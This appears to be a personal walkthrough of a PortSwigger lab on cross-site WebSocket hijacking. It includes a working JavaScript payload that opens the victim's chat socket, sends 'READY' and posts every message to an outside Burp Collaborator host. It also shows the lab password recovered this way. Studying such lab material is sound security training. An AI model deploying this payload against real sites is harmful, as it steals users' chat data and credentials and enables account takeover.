# Cross-site WebSocket hijacking

## This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).

## To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

### Note: burpsutepro use bbcause of burpcollector

1.  Click "Live chat" and send a chat message.
2.  Reload the page.
3.  In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4.  In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no [CSRF](https://portswigger.net/web-security/csrf) tokens.
5.  Right-click on the handshake request and select "Copy URL".
6.  In the browser, go to the exploit server and paste the following template into the "Body" section:

```html
<script>
  var ws = new WebSocket("wss://your-websocket-url");
  ws.onopen = function () {
    ws.send("READY");
  };
  ws.onmessage = function (event) {
    fetch("https://your-collaborator-url", {
      method: "POST",
      mode: "no-cors",
      body: event.data,
    });
  };
</script>
```

replace lab url
to get wss you need to intercept chat url forword request many times

```html
<script>
  var ws = new WebSocket(
    "wss://0a9f00c504262766882d267500d900fa.web-security-academy.net/chat"
  );
  ws.onopen = function () {
    ws.send("READY");
  };
  ws.onmessage = function (event) {
    fetch("https://0978p2vflxtt8a455g4x7se73y9pxgl5.oastify.com", {
      method: "POST",
      mode: "no-cors",
      body: event.data,
    });
  };
</script>
```

on burp collector pull request
one of the http reuest have json

```json
{
  "user": "Hal Pline",
  "content": "No problem carlos, it&apos;s bx6anovwp7h17q9c53nk"
}
```

bx6anovwp7h17q9c53nk => password
carlos => user
enter details and lab solved
